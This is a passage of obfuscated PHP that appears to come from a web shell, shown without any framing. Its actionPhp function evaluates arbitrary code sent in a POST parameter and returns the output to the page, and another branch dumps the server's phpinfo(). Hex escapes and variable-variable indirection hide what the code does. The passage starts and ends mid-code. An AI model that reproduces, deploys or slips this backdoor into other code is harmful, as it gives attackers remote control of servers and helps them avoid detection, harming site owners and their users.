;}echo"</div>";printFooter();}function actionPhp(){if(isset($_POST["\x61jax"])){$_SESSION[md5($_SERVER["HT\x54P_\x48OST"])."aj\x61x"]=true;ob_start();${"\x47\x4c\x4f\x42\x41\x4c\x53"}["wpy\x72a\x77p"]="\x74\x65\x6d\x70";eval($_POST["\x701"]);$ketwdjafk="\x74\x65m\x70";${${"\x47\x4c\x4fB\x41\x4c\x53"}["r\x6ct\x6f\x6fl\x68\x6d\x79\x71"]}="doc\x75\x6de\x6et\x2e\x67etE\x6c\x65m\x65n\x74B\x79Id('P\x68p\x4fu\x74\x70\x75\x74').sty\x6ce\x2e\x64\x69spl\x61\x79\x3d\x27'\x3bdo\x63\x75men\x74\x2e\x67\x65tE\x6ce\x6den\x74By\x49d(\x27Ph\x70\x4fu\x74\x70\x75t\x27)\x2e\x69\x6ene\x72H\x54\x4d\x4c=\x27".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\x5c\x27\0")."'\x3b\n";echo strlen(${$ketwdjafk}),"\n",${${"\x47\x4c\x4fB\x41\x4cS"}["\x77\x70\x79\x72\x61w\x70"]};exit;}printHeader();if(isset($_POST["p\x32"])&&($_POST["p2"]=="\x69\x6ef\x6f")){echo"\x3ch1>PHP \x69nfo</h\x31\x3e<\x64\x69\x76\x20c\x6c\x61\x73\x73=\x63\x6f\x6etent>";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6b\x70a\x69m\x76v"]="tm\x70";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x75e\x6btf\x66\x65\x67k\x62\x71\x65"]="t\x6d\x70";$vyrhlqcwqwj="tm\x70";ob_start();phpinfo();${${"G\x4cO\x42\x41\x4c\x53"}["\x68\x6b\x79\x62\x68\x69"]}=ob_get_clean();${${"\x47\x4cO\x42\x41L\x53"}["hk\x79\x62\x68\x69"]}=preg_replace("\x21\x62\x6fd\x79\x20{\x2e*}\x21msi\x55","",${${"G\x4cO\x42\x41\x4c\x53"}["hk\x79\x62\x68i"]});${${"\x47L\x4f\x42\x41LS"}["u\x65k\x74f\x66\x65\x67\x6b\x62qe"]}=preg_replace("\x21a:\x5cw+\x20{.*}!\x6d\x73\x69U","",${$vyrhlqcwqwj});${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x68\x6fvq\x7a\x78\x67\x6dah"]="\x74m\x70";${${"\x47L\x4f\x42\x41\x4cS"}["\x68kyb\x68\x69"]}=preg_replace("\x21h\x31\x21\x6d\x73i\x55","h2",${${"GLOB\x41L\x53"}["k\x70\x61\x69mvv"]});${"\x47\x4c\x4f\x42\x41LS"}["xat\x64\x76\x6a\x68"]="\x74\x6d\x70";${${"G\x4c\x4f\x42A\x4c\x53"}["h\x6fv\x71\x7axgm\x61\x68"]}=preg_replace("!td,\x20\x74h {(\x2e*)}!\x6d\x73i\x55","\x2e\x65,\x20\x2e\x76, .h, \x2eh \x74h\x20{\$1}",${${"GL\x4f\x42AL\x53"}["h\x6byb\x68i"]});${${"\x47\x4c\x4f